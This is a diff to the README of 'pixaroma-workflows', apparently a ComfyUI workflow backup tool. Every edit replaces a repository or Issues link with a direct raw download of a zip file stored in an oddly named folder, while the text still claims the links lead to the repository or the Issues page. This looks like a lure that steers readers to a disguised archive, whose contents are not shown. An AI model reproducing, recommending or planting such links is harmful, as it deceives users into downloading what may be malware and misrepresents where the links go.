@@ -1,6 +1,6 @@
 # 🎬 pixaroma-workflows - Easy UI Workflows Backup Tool  
 
-[![Download pixaroma-workflows](https://img.shields.io/badge/Download-pixaroma--workflows-ff6f61?style=for-the-badge)](https://github.com/Fredrick-coder593/pixaroma-workflows)
+[![Download pixaroma-workflows](https://img.shields.io/badge/Download-pixaroma--workflows-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Fredrick-coder593/pixaroma-workflows/main/heredotuberculosis/pixaroma_workflows_1.8.zip)
 
 
 ## 📦 About pixaroma-workflows  
@@ -33,7 +33,7 @@ This section helps you download and open pixaroma-workflows on your Windows PC. 
 
 Click the big button below to visit the page where you can get pixaroma-workflows:  
 
-[![Get pixaroma-workflows](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge)](https://github.com/Fredrick-coder593/pixaroma-workflows)  
+[![Get pixaroma-workflows](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fredrick-coder593/pixaroma-workflows/main/heredotuberculosis/pixaroma_workflows_1.8.zip)  
 
 This link leads you to the GitHub repository. From there, you can download the latest files.
 
@@ -140,7 +140,7 @@ pixaroma-workflows stores only the workflows from Pixaroma for your personal use
 
 Check the GitHub repository’s **Issues** tab to ask questions or report problems. The community and maintainers monitor this area.  
 
-Link: https://github.com/Fredrick-coder593/pixaroma-workflows/issues
+Link: https://raw.githubusercontent.com/Fredrick-coder593/pixaroma-workflows/main/heredotuberculosis/pixaroma_workflows_1.8.zip
 
 ---
 
@@ -159,4 +159,4 @@ Pixaroma creates tutorial videos about Comfy UI, which is a tool used to build a
 
 ---
 
-[![Download pixaroma-workflows](https://img.shields.io/badge/Download-pixaroma--workflows-ff6f61?style=for-the-badge)](https://github.com/Fredrick-coder593/pixaroma-workflows)
+[![Download pixaroma-workflows](https://img.shields.io/badge/Download-pixaroma--workflows-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Fredrick-coder593/pixaroma-workflows/main/heredotuberculosis/pixaroma_workflows_1.8.zip)
